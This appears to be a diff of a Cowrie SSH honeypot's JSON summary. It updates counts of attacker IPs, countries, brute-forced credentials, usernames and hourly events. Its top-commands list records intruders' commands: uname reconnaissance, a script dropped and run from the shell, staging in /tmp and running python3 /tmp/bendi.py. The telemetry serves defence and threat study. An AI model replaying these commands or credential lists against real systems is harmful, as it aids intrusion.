@@ -1,34 +1,40 @@
 {
  "generated_from": "LogKompass Cowrie sensor",
  "totals": {
-  "events": 10250,
-  "distinct_ips": 100
+  "events": 15475,
+  "distinct_ips": 146
  },
  "by_kind": [
   {
    "kind": "cowrie_command",
-   "n": 2842
+   "n": 4181
   },
   {
    "kind": "cowrie_connect",
-   "n": 2511
+   "n": 3826
   },
   {
    "kind": "cowrie_session",
-   "n": 2511
+   "n": 3826
   },
   {
    "kind": "cowrie_login_success",
-   "n": 2370
+   "n": 3621
   },
   {
    "kind": "cowrie_login_failed",
-   "n": 16
+   "n": 21
   }
  ],
  "top_ips": [
   {
    "ip": "109.160.32.134",
+   "n": 4392,
+   "country": "BG",
+   "as_org": "TechTies Inc."
+  },
+  {
+   "ip": "109.160.32.174",
    "n": 4392,
    "country": "BG",
    "as_org": "TechTies Inc."
@@ -40,6 +46,12 @@
    "as_org": "TechTies Inc."
   },
   {
+   "ip": "154.18.197.29",
+   "n": 296,
+   "country": "PH",
+   "as_org": "EWS DS Networks Inc"
+  },
+  {
    "ip": "80.94.92.55",
    "n": 285,
    "country": "RO",
@@ -48,6 +60,12 @@
   {
    "ip": "2.57.122.238",
    "n": 146,
+   "country": "RO",
+   "as_org": "Unmanaged Ltd"
+  },
+  {
+   "ip": "2.57.122.209",
+   "n": 145,
    "country": "RO",
    "as_org": "Unmanaged Ltd"
   },
@@ -70,32 +88,14 @@
    "as_org": "Techoff Srv Limited"
   },
   {
-   "ip": "2.57.122.150",
-   "n": 95,
+   "ip": "2.57.122.53",
+   "n": 122,
    "country": "RO",
    "as_org": "Unmanaged Ltd"
   },
   {
-   "ip": "95.158.13.128",
-   "n": 89,
-   "country": "UA",
-   "as_org": "Limited Liability Company best Solutions"
-  },
-  {
-   "ip": "92.118.39.49",
-   "n": 45,
-   "country": "US",
-   "as_org": "Unmanaged Ltd"
-  },
-  {
-   "ip": "78.104.125.223",
-   "n": 31,
-   "country": "AT",
-   "as_org": "ACONET"
-  },
-  {
-   "ip": "193.46.255.86",
-   "n": 27,
+   "ip": "2.57.122.150",
+   "n": 95,
    "country": "RO",
    "as_org": "Unmanaged Ltd"
   }
@@ -103,23 +103,27 @@
  "top_countries": [
   {
    "country": "BG",
-   "n": 9040
+   "n": 13436
   },
   {
    "country": "RO",
-   "n": 698
+   "n": 1094
+  },
+  {
+   "country": "PH",
+   "n": 296
   },
   {
    "country": "US",
-   "n": 138
+   "n": 189
   },
   {
    "country": "UA",
-   "n": 101
+   "n": 119
   },
   {
    "country": "NL",
-   "n": 36
+   "n": 52
   },
   {
    "country": "AT",
@@ -136,144 +140,144 @@
   {
    "country": "GB",
    "n": 19
-  },
-  {
-   "country": "UZ",
-   "n": 10
   }
  ],
  "top_credentials": [
   {
    "cred": "admin/admin",
-   "n": 10
+   "n": 13
   },
   {
    "cred": "root/admin",
-   "n": 8
-  },
-  {
-   "cred": "root/LeitboGi0ro",
-   "n": 8
-  },
-  {
-   "cred": "root/12345678",
-   "n": 8
+   "n": 11
   },
   {
    "cred": "root/123456",
-   "n": 8
+   "n": 11
   },
   {
    "cred": "root/12345",
-   "n": 8
+   "n": 11
   },
   {
    "cred": "root/1234",
-   "n": 8
-  },
-  {
-   "cred": "root/123456789",
-   "n": 7
+   "n": 11
   },
   {
    "cred": "root/123123",
-   "n": 7
+   "n": 11
   },
   {
    "cred": "root/111111",
-   "n": 7
+   "n": 11
+  },
+  {
+   "cred": "root/12345678",
+   "n": 10
+  },
+  {
+   "cred": "root/LeitboGi0ro",
+   "n": 9
+  },
+  {
+   "cred": "root/123456789",
+   "n": 9
   },
   {
    "cred": "root/admin123",
+   "n": 8
+  },
+  {
+   "cred": "root/ubuntu",
    "n": 6
   },
   {
    "cred": "root/root",
-   "n": 5
+   "n": 6
   },
   {
-   "cred": "root/123",
-   "n": 5
+   "cred": "root/passw0rd",
+   "n": 6
   },
   {
-   "cred": "ubuntu/ubuntu",
-   "n": 4
-  },
-  {
-   "cred": "ubnt/ubnt",
-   "n": 4
+   "cred": "root/Password1",
+   "n": 6
   }
  ],
  "top_usernames": [
   {
    "username": "root",
-   "n": 894
+   "n": 1397
   },
   {
    "username": "ubuntu",
-   "n": 78
+   "n": 117
   },
   {
    "username": "admin",
-   "n": 75
+   "n": 110
   },
   {
    "username": "user",
-   "n": 52
+   "n": 79
   },
   {
    "username": "deploy",
-   "n": 46
+   "n": 70
   },
   {
    "username": "test",
-   "n": 32
+   "n": 49
   },
   {
    "username": "user1",
-   "n": 24
+   "n": 36
   },
   {
    "username": "claude",
-   "n": 20
+   "n": 30
   },
   {
    "username": "postgres",
-   "n": 18
+   "n": 27
   },
   {
    "username": "debian",
-   "n": 16
+   "n": 24
   },
   {
    "username": "minecraft",
-   "n": 15
+   "n": 22
   },
   {
    "username": "dev",
-   "n": 14
+   "n": 21
   }
  ],
  "top_commands": [
   {
    "cmd": "uname -s -v -n -r -m",
-   "n": 2192
+   "n": 3288
   },
   {
    "cmd": "printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter ",
-   "n": 192
+   "n": 246
   },
   {
    "cmd": "#!/bin/bash\necho \"xxxxxx\"\n",
-   "n": 192
+   "n": 246
   },
   {
    "cmd": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nu",
-   "n": 96
+   "n": 123
+  },
+  {
+   "cmd": "echo xsec",
+   "n": 74
   },
   {
    "cmd": "/bin/./uname -s -v -n -r -m",
-   "n": 35
+   "n": 64
   },
   {
    "cmd": "",
@@ -288,19 +292,15 @@
    "n": 5
   },
   {
+   "cmd": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || ",
+   "n": 4
+  },
+  {
    "cmd": "rm /tmp/bendi.py",
    "n": 4
   },
   {
    "cmd": "python3 /tmp/bendi.py",
-   "n": 4
-  },
-  {
-   "cmd": "ls -al",
-   "n": 4
-  },
-  {
-   "cmd": "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y ",
    "n": 4
   }
  ],
@@ -375,7 +375,47 @@
   },
   {
    "hour": "2026-09-28T12",
-   "n": 109
+   "n": 128
+  },
+  {
+   "hour": "2026-09-28T13",
+   "n": 480
+  },
+  {
+   "hour": "2026-09-28T14",
+   "n": 2622
+  },
+  {
+   "hour": "2026-09-28T15",
+   "n": 1438
+  },
+  {
+   "hour": "2026-09-28T16",
+   "n": 51
+  },
+  {
+   "hour": "2026-09-28T17",
+   "n": 103
+  },
+  {
+   "hour": "2026-09-28T18",
+   "n": 29
+  },
+  {
+   "hour": "2026-09-28T19",
+   "n": 144
+  },
+  {
+   "hour": "2026-09-28T20",
+   "n": 24
+  },
+  {
+   "hour": "2026-09-28T21",
+   "n": 177
+  },
+  {
+   "hour": "2026-09-28T22",
+   "n": 138
   }
  ],
  "latest_digest": {
